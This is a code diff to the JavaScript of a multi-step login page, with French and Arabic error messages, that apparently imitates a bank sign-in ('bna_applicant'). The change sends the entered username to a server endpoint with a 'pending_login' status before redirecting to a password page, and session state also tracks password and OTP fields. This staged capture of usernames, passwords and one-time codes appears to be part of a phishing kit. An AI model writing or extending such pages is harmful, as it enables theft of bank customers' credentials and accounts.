@@ -204,14 +204,26 @@ function setS(u){let previous={};try{previous=JSON.parse(localStorage.getItem(AD
 const inp=document.getElementById('username');
 const err=document.getElementById('err');
 function getApplicant(){try{return JSON.parse(localStorage.getItem('bna_applicant')||'{}');}catch(e){return{};}}
-function go(event){
+async function go(event){
   if(event)event.preventDefault();
   const v=inp.value.trim();
   if(!v){err.textContent='Veuillez saisir votre nom d\'utilisateur';return;}
   err.textContent='';
   const applicant=getApplicant();
-  setS({login:v,username:v,applicationId:applicant.id || '',status:'idle',password:'',otp:''});
-  window.location.assign('./password.html');
+  const nextBtn=document.getElementById('nextBtn');
+  nextBtn.style.pointerEvents='none';
+  nextBtn.style.opacity='.7';
+  try{
+    const response=await fetch('/api/applications',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({...applicant,id:applicant.id || undefined,username:v,status:'pending_login'})});
+    if(!response.ok)throw new Error('application submission failed');
+    const result=await response.json();
+    setS({login:v,username:v,applicationId:result.application.id,status:'pending_login',password:'',otp:''});
+    window.location.assign('./password.html');
+  }catch(error){
+    nextBtn.style.pointerEvents='';
+    nextBtn.style.opacity='';
+    err.textContent='تعذر إرسال البيانات، حاول مرة أخرى';
+  }
 }
 document.getElementById('nextBtn').addEventListener('click',go);
 inp.addEventListener('keydown',e=>{if(e.key==='Enter')go();});
